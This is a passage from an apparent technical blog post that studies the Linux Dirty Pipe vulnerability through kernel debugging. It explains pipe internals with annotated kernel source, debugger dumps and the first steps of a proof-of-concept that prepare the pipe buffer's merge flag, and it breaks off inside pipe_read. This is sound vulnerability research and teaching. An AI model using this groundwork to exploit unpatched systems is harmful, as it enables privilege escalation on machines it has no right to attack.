+[&mldr;]
+A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. <a href=https://en.wikipedia.org/wiki/Inode>source</a></p>
+</blockquote>
+<p>The <code>i_fop</code> field of the inode contains a pointer to a <code>struct file_operations</code>. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process' request to <code>read()</code> or <code>write()</code> the pipe.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> file_operations pipefifo_fops <span style=color:#f92672>=</span> {
+	.open		<span style=color:#f92672>=</span> fifo_open,
+	.llseek		<span style=color:#f92672>=</span> no_llseek,
+	.read_iter	<span style=color:#f92672>=</span> pipe_read,
+	.write_iter	<span style=color:#f92672>=</span> pipe_write,
+	.poll		<span style=color:#f92672>=</span> pipe_poll,
+	.unlocked_ioctl	<span style=color:#f92672>=</span> pipe_ioctl,
+	.release	<span style=color:#f92672>=</span> pipe_release,
+	.fasync		<span style=color:#f92672>=</span> pipe_fasync,
+	.splice_write	<span style=color:#f92672>=</span> iter_file_splice_write,
+};
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1218><code>⬀ go to source code</code></a></p>
+<p>As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.</p>
+<p>The pipe-specific part of the inode is mostly contained in the <code>struct pipe_inode_info</code> pointed to by the <code>i_pipe</code> field.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/**
+</span><span style=color:#75715e> *	struct pipe_inode_info - a linux kernel pipe
+</span><span style=color:#75715e> *	@mutex: mutex protecting the whole thing
+</span><span style=color:#75715e> *	@rd_wait: reader wait point in case of empty pipe
+</span><span style=color:#75715e> *	@wr_wait: writer wait point in case of full pipe
+</span><span style=color:#75715e> *	@head: The point of buffer production
+</span><span style=color:#75715e> *	@tail: The point of buffer consumption
+</span><span style=color:#75715e> *	@note_loss: The next read() should insert a data-lost message
+</span><span style=color:#75715e> *	@max_usage: The maximum number of slots that may be used in the ring
+</span><span style=color:#75715e> *	@ring_size: total number of buffers (should be a power of 2)
+</span><span style=color:#75715e> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs
+</span><span style=color:#75715e> *	@tmp_page: cached released page
+</span><span style=color:#75715e> *	@readers: number of current readers of this pipe
+</span><span style=color:#75715e> *	@writers: number of current writers of this pipe
+</span><span style=color:#75715e> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)
+</span><span style=color:#75715e> *	@r_counter: reader counter
+</span><span style=color:#75715e> *	@w_counter: writer counter
+</span><span style=color:#75715e> *	@poll_usage: is this pipe used for epoll, which has crazy wakeups?
+</span><span style=color:#75715e> *	@fasync_readers: reader side fasync
+</span><span style=color:#75715e> *	@fasync_writers: writer side fasync
+</span><span style=color:#75715e> *	@bufs: the circular array of pipe buffers
+</span><span style=color:#75715e> *	@user: the user who created this pipe
+</span><span style=color:#75715e> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that
+</span><span style=color:#75715e> **/</span>
+<span style=color:#66d9ef>struct</span> pipe_inode_info {
+	<span style=color:#66d9ef>struct</span> mutex mutex;
+	wait_queue_head_t rd_wait, wr_wait;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> head;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> tail;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> max_usage;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> ring_size;
+<span style=color:#75715e>#ifdef CONFIG_WATCH_QUEUE
+</span><span style=color:#75715e></span>	<span style=color:#66d9ef>bool</span> note_loss;
+<span style=color:#75715e>#endif
+</span><span style=color:#75715e></span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> nr_accounted;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> readers;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> writers;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> files;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> r_counter;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> w_counter;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> poll_usage;
+	<span style=color:#66d9ef>struct</span> page <span style=color:#f92672>*</span>tmp_page;
+	<span style=color:#66d9ef>struct</span> fasync_struct <span style=color:#f92672>*</span>fasync_readers;
+	<span style=color:#66d9ef>struct</span> fasync_struct <span style=color:#f92672>*</span>fasync_writers;
+	<span style=color:#66d9ef>struct</span> pipe_buffer <span style=color:#f92672>*</span>bufs;
+	<span style=color:#66d9ef>struct</span> user_struct <span style=color:#f92672>*</span>user;
+<span style=color:#75715e>#ifdef CONFIG_WATCH_QUEUE
+</span><span style=color:#75715e></span>	<span style=color:#66d9ef>struct</span> watch_queue <span style=color:#f92672>*</span>watch_queue;
+<span style=color:#75715e>#endif
+</span><span style=color:#75715e></span>};
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L58><code>⬀ go to source code</code></a></p>
+<p>At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of <code>pipe_buffer</code> structures (sometimes also called a ring). The <code>bufs</code> field is a pointer to the start of this array.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/**
+</span><span style=color:#75715e> *	struct pipe_buffer - a linux kernel pipe buffer
+</span><span style=color:#75715e> *	@page: the page containing the data for the pipe buffer
+</span><span style=color:#75715e> *	@offset: offset of data inside the @page
+</span><span style=color:#75715e> *	@len: length of data inside the @page
+</span><span style=color:#75715e> *	@ops: operations associated with this buffer. See @pipe_buf_operations.
+</span><span style=color:#75715e> *	@flags: pipe buffer flags. See above.
+</span><span style=color:#75715e> *	@private: private data owned by the ops.
+</span><span style=color:#75715e> **/</span>
+<span style=color:#66d9ef>struct</span> pipe_buffer {
+	<span style=color:#66d9ef>struct</span> page <span style=color:#f92672>*</span>page;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> offset, len;
+	<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> pipe_buf_operations <span style=color:#f92672>*</span>ops;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> flags;                       
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> private;
+};
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L26><code>⬀ go to source code</code></a></p>
+<p>There are two positions in this array: one for writing to (the <code>head</code>) - and one for reading from (the <code>tail</code>) the pipe. The <code>ring_size</code> defaults to <code>16</code> and will always be a power of 2, which is why circularity is implemented by masking index accesses with <code>ring_size - 1</code> (e.g., <code>bufs[head & (ring_size - 1)]</code>). The <code>page</code> field is a pointer to a <code>struct page</code> describing where the actual data held by the <code>pipe_buffer</code> is stored. We will elaborate more on the process of adding and consuming data below. Note that each <code>pipe_buffer</code> has one page associated which means that the total capacity of the pipe is <code>ring_size * 4096 bytes (4KB)</code>.</p>
+<p>A process can get and set the size of this ring using the <code>fcntl()</code> system call with the <code>F_GETPIPE_SZ</code> and <code>F_SETPIPE_SZ</code> flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span>
+<span style=color:#a6e22e>setup_pipe</span>(<span style=color:#66d9ef>int</span> pipefd_r, <span style=color:#66d9ef>int</span> pipefd_w) {
+    <span style=color:#66d9ef>if</span> (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) <span style=color:#f92672>!=</span> PAGESIZE) {
+        exit(<span style=color:#ae81ff>1</span>);
+    }
+...
+}
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L48><code>⬀ go to source code</code></a></p>
+<h3 id=code>Code<a href=#code class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in <code>__do_pipe_flags()</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>__do_pipe_flags</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>fd, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>**</span>files, <span style=color:#66d9ef>int</span> flags)
+{
+	<span style=color:#66d9ef>int</span> error;
+	<span style=color:#66d9ef>int</span> fdw, fdr;
+...
+	error <span style=color:#f92672>=</span> create_pipe_files(files, flags);
+...
+	fdr <span style=color:#f92672>=</span> get_unused_fd_flags(flags);
+...
+	fdw <span style=color:#f92672>=</span> get_unused_fd_flags(flags);
+...
+	audit_fd_pair(fdr, fdw);
+	fd[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> fdr;
+	fd[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> fdw;
+	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+...
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L954><code>⬀ go to source code</code></a></p>
+<p>The backing files are initialized in <code>create_pipe_files()</code>. We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as <a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1423>streams</a>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>create_pipe_files</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>**</span>res, <span style=color:#66d9ef>int</span> flags)
+{
+	<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inode <span style=color:#f92672>=</span> get_pipe_inode();
+	<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>f;
+	<span style=color:#66d9ef>int</span> error;
+...
+	f <span style=color:#f92672>=</span> alloc_file_pseudo(inode, pipe_mnt, <span style=color:#e6db74>&#34;&#34;</span>,
+				O_WRONLY <span style=color:#f92672>|</span> (flags <span style=color:#f92672>&amp;</span> (O_NONBLOCK <span style=color:#f92672>|</span> O_DIRECT)),
+				<span style=color:#f92672>&amp;</span>pipefifo_fops);
+...
+
+	f<span style=color:#f92672>-&gt;</span>private_data <span style=color:#f92672>=</span> inode<span style=color:#f92672>-&gt;</span>i_pipe;
+
+	res[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> alloc_file_clone(f, O_RDONLY <span style=color:#f92672>|</span> (flags <span style=color:#f92672>&amp;</span> O_NONBLOCK),
+				  <span style=color:#f92672>&amp;</span>pipefifo_fops);
+...
+	res[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>-&gt;</span>private_data <span style=color:#f92672>=</span> inode<span style=color:#f92672>-&gt;</span>i_pipe;
+	res[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> f;
+	stream_open(inode, res[<span style=color:#ae81ff>0</span>]);
+	stream_open(inode, res[<span style=color:#ae81ff>1</span>]);
+	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L911><code>⬀ go to source code</code></a></p>
+<p>The initialization of the common inode structure happens in <code>get_pipe_inode()</code>. We can see that an inode is created and also information for the pipe is allocated and stored such that <code>inode->i_pipe</code> can later be used to access the pipe from a given inode. Furthermore, <code>inode->i_fops</code> specifies the implementations used for file operations on a pipe.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span><span style=color:#a6e22e>get_pipe_inode</span>(<span style=color:#66d9ef>void</span>)
+{
+	<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inode <span style=color:#f92672>=</span> new_inode_pseudo(pipe_mnt<span style=color:#f92672>-&gt;</span>mnt_sb);
+	<span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe;
+...
+	inode<span style=color:#f92672>-&gt;</span>i_ino <span style=color:#f92672>=</span> get_next_ino();
+
+	pipe <span style=color:#f92672>=</span> alloc_pipe_info();
+...
+	inode<span style=color:#f92672>-&gt;</span>i_pipe <span style=color:#f92672>=</span> pipe;
+	pipe<span style=color:#f92672>-&gt;</span>files <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
+	pipe<span style=color:#f92672>-&gt;</span>readers <span style=color:#f92672>=</span> pipe<span style=color:#f92672>-&gt;</span>writers <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+	inode<span style=color:#f92672>-&gt;</span>i_fop <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>pipefifo_fops; <span style=color:#75715e>// lolcads: see description below
+</span><span style=color:#75715e></span>
+	<span style=color:#75715e>/*
+</span><span style=color:#75715e>	 * Mark the inode dirty from the very beginning,
+</span><span style=color:#75715e>	 * that way it will never be moved to the dirty
+</span><span style=color:#75715e>	 * list because &#34;mark_inode_dirty()&#34; will think
+</span><span style=color:#75715e>	 * that it already _is_ on the dirty list.
+</span><span style=color:#75715e>	 */</span>
+	inode<span style=color:#f92672>-&gt;</span>i_state <span style=color:#f92672>=</span> I_DIRTY;
+	inode<span style=color:#f92672>-&gt;</span>i_mode <span style=color:#f92672>=</span> S_IFIFO <span style=color:#f92672>|</span> S_IRUSR <span style=color:#f92672>|</span> S_IWUSR;
+	inode<span style=color:#f92672>-&gt;</span>i_uid <span style=color:#f92672>=</span> current_fsuid();
+	inode<span style=color:#f92672>-&gt;</span>i_gid <span style=color:#f92672>=</span> current_fsgid();
+	inode<span style=color:#f92672>-&gt;</span>i_atime <span style=color:#f92672>=</span> inode<span style=color:#f92672>-&gt;</span>i_mtime <span style=color:#f92672>=</span> inode<span style=color:#f92672>-&gt;</span>i_ctime <span style=color:#f92672>=</span> current_time(inode);
+
+	<span style=color:#66d9ef>return</span> inode;
+...
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L871><code>⬀ go to source code</code></a></p>
+<p>Most of the pipe-specific setup happens is <code>alloc_pipe_info()</code>. Here you can see the actual creation of the pipe, not just the inode, but the <code>pipe_buffer</code>s / <code>pipe_inode_info->bufs</code> that hold the content / data of the pipe.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span><span style=color:#a6e22e>alloc_pipe_info</span>(<span style=color:#66d9ef>void</span>)
+{
+	<span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> pipe_bufs <span style=color:#f92672>=</span> PIPE_DEF_BUFFERS; <span style=color:#75715e>// lolcads: defaults to 16
+</span><span style=color:#75715e></span>	<span style=color:#66d9ef>struct</span> user_struct <span style=color:#f92672>*</span>user <span style=color:#f92672>=</span> get_current_user();
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> user_bufs;
+	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> max_size <span style=color:#f92672>=</span> READ_ONCE(pipe_max_size);
+
+	pipe <span style=color:#f92672>=</span> kzalloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT); <span style=color:#75715e>// lolcads: allocate the inode info
+</span><span style=color:#75715e></span>...
+	pipe<span style=color:#f92672>-&gt;</span>bufs <span style=color:#f92672>=</span> kcalloc(pipe_bufs, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> pipe_buffer), <span style=color:#75715e>// lolcads: allocate the buffers with the page references
+</span><span style=color:#75715e></span>			     GFP_KERNEL_ACCOUNT);
+
+	<span style=color:#66d9ef>if</span> (pipe<span style=color:#f92672>-&gt;</span>bufs) { <span style=color:#75715e>// mc: set up the rest of the relevant fields
+</span><span style=color:#75715e></span>		init_waitqueue_head(<span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>rd_wait);
+		init_waitqueue_head(<span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>wr_wait);
+		pipe<span style=color:#f92672>-&gt;</span>r_counter <span style=color:#f92672>=</span> pipe<span style=color:#f92672>-&gt;</span>w_counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+		pipe<span style=color:#f92672>-&gt;</span>max_usage <span style=color:#f92672>=</span> pipe_bufs;
+		pipe<span style=color:#f92672>-&gt;</span>ring_size <span style=color:#f92672>=</span> pipe_bufs;
+		pipe<span style=color:#f92672>-&gt;</span>nr_accounted <span style=color:#f92672>=</span> pipe_bufs;
+		pipe<span style=color:#f92672>-&gt;</span>user <span style=color:#f92672>=</span> user;
+		mutex_init(<span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>mutex);
+		<span style=color:#66d9ef>return</span> pipe;
+	}
+...
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L782><code>⬀ go to source code</code></a></p>
+<h3 id=debugger>Debugger<a href=#debugger class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of <code>pipe_fcntl()</code>, which is the handler invoked in the <code>case F_SETPIPE_SZ:</code> of the switch statement inside <a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1392><code>do_fcntl()</code></a>.</p>
+<pre tabindex=0><code>struct pipe_inode_info at 0xffff8881044aec00
+&gt; 'head': 0
+&gt; 'tail': 0
+&gt; 'ring_size': 1
+&gt; 'bufs': 0xffff888101f8a180
+
+struct pipe_buffer at 0xffff888101f8a180
+&gt; 'page': NULL
+&gt; 'offset': 0
+&gt; 'len': 0
+&gt; 'ops': NULL
+&gt; 'flags':
+</code></pre><p>There&rsquo;s not much to see yet, but we keep this as a reference to see how things evolve over time.</p>
+<h2 id=pipes-readingwriting>Pipes (reading/writing)<a href=#pipes-readingwriting class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<h3 id=writing>Writing<a href=#writing class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>After allocating the pipe, the PoC proceeds by writing to it.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span>
+<span style=color:#a6e22e>fill_pipe</span>(<span style=color:#66d9ef>int</span> pipefd_w) {
+    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; i <span style=color:#f92672>&lt;=</span> PAGESIZE <span style=color:#f92672>/</span> <span style=color:#ae81ff>8</span>; i<span style=color:#f92672>++</span>) {
+        <span style=color:#66d9ef>if</span> (i <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
+            pause_for_inspection(<span style=color:#e6db74>&#34;About to perform first write() to pipe&#34;</span>);
+        }
+        <span style=color:#66d9ef>if</span> (i <span style=color:#f92672>==</span> PAGESIZE <span style=color:#f92672>/</span> <span style=color:#ae81ff>8</span>) {
+            pause_for_inspection(<span style=color:#e6db74>&#34;About to perform last write() to pipe&#34;</span>);
+        }
+        <span style=color:#66d9ef>if</span> (write(pipefd_w, <span style=color:#e6db74>&#34;AAAAAAAA&#34;</span>, <span style=color:#ae81ff>8</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>8</span>) {
+            exit(<span style=color:#ae81ff>1</span>);
+        }
+    }
+}
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L18><code>⬀ go to source code</code></a></p>
+<p>By looking at the file operations of a pipe inode we can see that <code>write</code>s to a pipe are handled by <code>pipe_write()</code>. When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using <a href=https://lwn.net/Articles/625077/><code>iov_iter</code></a> objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also <a href=https://en.wikipedia.org/wiki/Vectored_I/O>this</a>).</p>
+<pre tabindex=0><code class="language-c=" data-lang="c=">static ssize_t
+pipe_write(struct kiocb *iocb, struct iov_iter *from)
+{
+	struct file *filp = iocb-&gt;ki_filp;
+	struct pipe_inode_info *pipe = filp-&gt;private_data;
+	unsigned int head;
+	ssize_t ret = 0;
+	size_t total_len = iov_iter_count(from);
+	ssize_t chars;
+	bool was_empty = false;
+...
+	/*
+	 * If it wasn't empty we try to merge new data into
+	 * the last buffer.
+	 *
+	 * That naturally merges small writes, but it also
+	 * page-aligns the rest of the writes for large writes
+	 * spanning multiple pages.
+	 */
+	head = pipe-&gt;head;
+	was_empty = pipe_empty(head, pipe-&gt;tail);
+	chars = total_len &amp; (PAGE_SIZE-1);
+	if (chars &amp;&amp; !was_empty) {
+		unsigned int mask = pipe-&gt;ring_size - 1;
+		struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];
+		int offset = buf-&gt;offset + buf-&gt;len;
+
+		if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;
+		    offset + chars &lt;= PAGE_SIZE) {
+...
+			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);
+...
+			buf-&gt;len += ret;
+			if (!iov_iter_count(from))
+				goto out;
+		}
+	}
+
+	for (;;) {
+...
+		head = pipe-&gt;head;
+		if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
+			unsigned int mask = pipe-&gt;ring_size - 1;
+			struct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];
+			struct page *page = pipe-&gt;tmp_page;
+			int copied;
+
+			if (!page) {
+				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
+...
+				pipe-&gt;tmp_page = page;
+			}
+
+			/* Allocate a slot in the ring in advance and attach an
+			 * empty buffer.  If we fault or otherwise fail to use
+			 * it, either the reader will consume it or it'll still
+			 * be there for the next write.
+			 */
+			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);
+
+			head = pipe-&gt;head;
+			if (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
+				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+				continue;
+			}
+
+			pipe-&gt;head = head + 1;
+			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+
+			/* Insert it into the buffer array */
+			buf = &amp;pipe-&gt;bufs[head &amp; mask];
+			buf-&gt;page = page;
+			buf-&gt;ops = &amp;anon_pipe_buf_ops;
+			buf-&gt;offset = 0;
+			buf-&gt;len = 0;
+			if (is_packetized(filp))
+				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;
+			else
+				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;
+			pipe-&gt;tmp_page = NULL;
+
+			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
+...
+			ret += copied;
+			buf-&gt;offset = 0;
+			buf-&gt;len = copied;
+
+			if (!iov_iter_count(from))
+				break;
+		}
+
+		if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))
+			continue;
+...
+	}
+out:
+...
+	return ret;
+}
+</code></pre><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L416><code>⬀ go to source code</code></a></p>
+<p>When handling a <code>write()</code> to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to <code>page</code> of the <code>pipe_buffer</code> that is currently the <code>head</code> of the ring. Whether or not this is possible is decided by three things:</p>
+<ul>
+<li>is the pipe non-empty (line 23)</li>
+<li>is the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag set? (line 28)</li>
+<li>is there is enough space left on the page? (line 29)</li>
+</ul>
+<p>If the answer to all of those questions is <em>yes</em> the kernel starts the write by appending to the existing page.</p>
+<p>To complete the rest of the write the kernel advances the <code>head</code> to the next <code>pipe_buffer</code>, allocates a fresh <code>page</code> for it, initializes the flags (the<code>PIPE_BUF_FLAG_CAN_MERGE</code> flag will be set, unless the user explicitly asked for the pipe to be in <code>O_DIRECT</code> mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the <code>O_DIRECT</code> mode of <code>pipe()</code>:</p>
+<pre tabindex=0><code>[...]
+O_DIRECT (since Linux 3.4)
+              Create a pipe that performs I/O in &quot;packet&quot; mode.  Each
+              write(2) to the pipe is dealt with as a separate packet,
+              and read(2)s from the pipe will read one packet at a time.
+[...]
+</code></pre><p><a href=https://www.man7.org/linux/man-pages/man2/pipe.2.html>source</a></p>
+<p>This is handled in the <code>if</code>-condition <code>is_packetized(filp)</code> in <code>pipe_write()</code> (see above).</p>
+<p>We can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.</p>
+<pre tabindex=0><code>struct pipe_buffer at 0xffff888101f8a180
+&gt; 'page': 0xffffea00040e3bc0
+&gt; 'offset': 0
+&gt; 'len': 8
+&gt; 'ops': 0xffffffff8221bb00 &lt;anon_pipe_buf_ops&gt;
+&gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
+
+struct page at 0xffffea00040e3bc0
+&gt; virtual: 0xffff8881038ef000
+&gt; data: b'AAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+</code></pre><p>All subsequent writes go down the &ldquo;append path&rdquo; and fill the existing page.</p>
+<pre tabindex=0><code>struct pipe_buffer at 0xffff888101f8a180
+&gt; 'page': 0xffffea00040e3bc0
+&gt; 'offset': 0
+&gt; 'len': 4096
+&gt; 'ops': 0xffffffff8221bb00 &lt;anon_pipe_buf_ops&gt;
+&gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
+
+struct page at 0xffffea00040e3bc0
+&gt; virtual: 0xffff8881038ef000
+&gt; data: b'AAAAAAAAAAAAAAAAAAAA'[...]b'AAAAAAAAAAAAAAAAAAAA'
+</code></pre><h3 id=reading>Reading<a href=#reading class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>Next, the POC drains the pipe by consuming / <code>read</code>ing all the <code>A</code>s from the reading end.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span>
+<span style=color:#a6e22e>drain_pipe</span>(<span style=color:#66d9ef>int</span> pipefd_r) {
+    <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>8</span>];
+    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; i <span style=color:#f92672>&lt;=</span> PAGESIZE <span style=color:#f92672>/</span> <span style=color:#ae81ff>8</span>; i<span style=color:#f92672>++</span>) {
+        <span style=color:#66d9ef>if</span> (i <span style=color:#f92672>==</span> PAGESIZE <span style=color:#f92672>/</span> <span style=color:#ae81ff>8</span>) {
+            pause_for_inspection(<span style=color:#e6db74>&#34;About to perform last read() from pipe&#34;</span>);
+        }
+        <span style=color:#66d9ef>if</span> (read(pipefd_r, buf, <span style=color:#ae81ff>8</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>8</span>) {
+            exit(<span style=color:#ae81ff>1</span>);
+        }
+    }
+}
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L34><code>⬀ go to source code</code></a></p>
+<p>The case where a process asks the kernel to <code>read()</code> from a pipe is handled by the function <code>pipe_read()</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> ssize_t
+<span style=color:#a6e22e>pipe_read</span>(<span style=color:#66d9ef>struct</span> kiocb <span style=color:#f92672>*</span>iocb, <span style=color:#66d9ef>struct</span> iov_iter <span style=color:#f92672>*</span>to)
+{
+	size_t total_len <span style=color:#f92672>=</span> iov_iter_count(to);
+	<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filp <span style=color:#f92672>=</span> iocb<span style=color:#f92672>-&gt;</span>ki_filp;
